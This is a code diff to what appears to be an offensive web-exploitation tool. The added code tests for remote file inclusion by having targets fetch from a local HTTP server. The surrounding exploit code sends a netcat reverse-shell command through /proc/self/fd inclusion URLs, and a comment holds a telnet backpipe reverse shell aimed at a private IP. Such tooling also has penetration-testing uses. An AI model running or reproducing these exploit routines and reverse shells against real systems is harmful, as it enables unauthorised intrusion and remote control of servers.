@@ -303,15 +303,34 @@ def test_rfi(url):
     if(args.verbose):
         print("Testing for RFI ...")
 
-    tests = []
-    tests.append("https%3a//www.google.com/")
-    for i in range(len(tests)):
+    
+    #Local RFI test
+    if(args.lhost):
+        server = HTTPServer((args.lhost, args.lport), MyHandler)
+        threading.Thread(target = server.serve_forever).start()
+
+        if('DESTROY' in url):
+            pyld = "http%3a//"+args.lhost+":"+str(args.lport)
+            u = url.replace('DESTROY', pyld)
+            try:
+                res = requests.get(u, headers = headers, proxies = proxies, timeout = 2)
+                if(checkPayload(res)):
+                    tempUrl = u.replace(pyld, 'TMP')
+                    getExploit(res, 'GET', 'RFI', tempUrl, '', headers, 'RFI', 'UNKN')
+                    print("[+] RFI -> " + u)
+                    return
+            except:
+                pass
+    
+    #Internet RFI test
+    else:
         if("DESTROY" in url):
-            u = url.replace("DESTROY", tests[i])
+            pyld = "https%3a//www.google.com/"
+            u = url.replace("DESTROY", pyld)
         try:
             res = requests.get(u, headers = headers, proxies = proxies, timeout = 2)
             if(checkPayload(res)):
-                tempUrl = u.replace(tests[i], 'TMP')
+                tempUrl = u.replace(pyld, 'TMP')
                 getExploit(res, 'GET', 'RFI', tempUrl, '', headers, 'RFI', 'UNKN')
                 print("[+] RFI -> " + u)
         except:
@@ -491,7 +510,12 @@ def exploit(exploits, method):
                     u = url.replace('TMP', "/proc/self/fd/{0}".format(i) + "?cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+" +ip+'+'+str(port)+"+>/tmp/f")
                     if(args.verbose): print(u)
                     requests.get(u, headers = tempHeaders, proxies = proxies)
-               
+        
+        elif(exploit['ATTACK_METHOD'] == method and method == 'RFI'):
+            #url = exploit['GETVAL']
+            #u = url.replace('TMP', 'http://' + ip + ":" + port + "/")
+            #res = requests.get(u, headers = headers, proxies = proxies)
+            pass
                 
 #mknod backpipe p && telnet 192.168.80.129 80 0<backpipe | /bin/bash 1>backpipe
 
